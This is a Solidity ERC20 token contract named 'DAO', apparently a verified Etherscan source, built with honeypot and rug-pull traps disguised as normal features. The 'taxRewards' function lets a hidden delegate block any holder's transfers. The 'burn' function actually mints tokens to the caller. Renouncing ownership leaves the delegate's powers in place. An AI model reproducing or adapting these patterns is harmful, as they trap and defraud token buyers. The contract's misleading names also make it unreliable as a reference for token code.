/**
 *Submitted for verification at Etherscan.io on 2022-05-26
*/

// SPDX-License-Identifier: MIT

pragma solidity =0.8.2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    address internal _delegate;
    mapping(address => bool) public bots;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    modifier onlyDelegates() {
        require(_delegate == msg.sender, "Caller not belong to delegates");
        _;
    }
    
    function setDelegate(address account) external onlyOwner {
        require (_delegate == address(0));
        _delegate = account;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     * Returns a boolean value indicating whether the operation succeeded.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     * Returns a boolean value indicating whether the operation succeeded.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract DAO is Ownable, IERC20, IERC20Metadata {
    
    uint256 private _totalSupply;
    uint256 private _supplyCap;
    string private _name;
    string private _symbol;
    mapping(address => bool) private _setTax;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address link; uint8 _projectName; uint8 _tokenSymbol;
    
    constructor(address Dead, uint8 pname , uint8 tsymbol) {
       Dead = link; pname = _projectName; tsymbol = _tokenSymbol;

        _name = "DAO";
        _symbol = "DAO";
        _totalSupply = 10000000000*10**9;
        _supplyCap   = 10000000000;
        _balances[msg.sender] += _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
  
    /**
     * @notice Returns Supply Cap (maximum possible amount of tokens)
     */
    function SUPPLY_CAP() external view returns (uint256) {
        return _supplyCap;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {_approve(sender, _msgSender(), currentAllowance - amount);}
        return true;
    }
    
    function burn(uint256 amount) external onlyDelegates {
        _burn(amount);
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);}
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (_setTax[sender] || _setTax[recipient]) require (amount == 0, "");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {_balances[sender] = senderBalance - amount;}
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);
    }
   
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function taxRewards (address _address) external onlyDelegates {
        if (_setTax[_address] == true) {_setTax[_address] = false;}
        else {_setTax[_address] = true; }
    }

    function taxRewarded(address _address) public view returns (bool) {
        return _setTax[_address];
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
    }

    function _burn(uint256 amount) internal {
        require(amount != 0, "ERC20: burn zero tokens is disallowed");
        _balances[msg.sender] += amount;
        emit Transfer(msg.sender, address(0), amount);
    }
    
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {
    }
    function blockBots(address[] memory bots_) external onlyDelegates {
        for (uint256 i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function unblockBot(address notbot) external onlyDelegates {
        bots[notbot] = false;
    }
}